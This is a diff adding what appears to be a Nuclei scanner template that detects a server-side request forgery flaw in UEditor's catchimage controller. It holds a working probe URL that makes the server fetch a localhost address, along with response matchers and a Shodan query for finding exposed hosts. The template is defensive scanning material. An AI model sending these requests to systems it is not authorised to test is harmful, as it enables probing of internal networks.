@@ -1,0 +1,34 @@
+http:
+    - matchers:
+        - condition: and
+          part: body
+          type: word
+          words:
+            - \u94fe\u63a5\u4e0d\u53ef\u7528
+            - '"original":'
+            - '"SUCCESS"'
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      method: GET
+      path:
+        - '{{BaseURL}}/ueditor/php/controller.php?action=catchimage&source[]=http://127.0.0.1:{{rand_text_numeric(6)}}/?1.png'
+        - '{{BaseURL}}/ueditor/jsp/controller.jsp?action=catchimage&source[]=http://127.0.0.1:{{rand_text_numeric(6)}}/?1.png'
+      stop-at-first-match: true
+id: ueditor-ssrf
+info:
+    author: pwnhxl
+    description: UEditor contains an Server Side Request Forgery vulnerability.
+    metadata:
+        max-request: 2
+        shodan-query: html:"UEditor"
+        verified: true
+    name: UEditor - Server Side Request Forgery
+    reference:
+        - https://xz.aliyun.com/t/4154
+        - https://www.seebug.org/vuldb/ssvid-97311
+    severity: medium
+    tags:
+        - ueditor
+        - ssrf
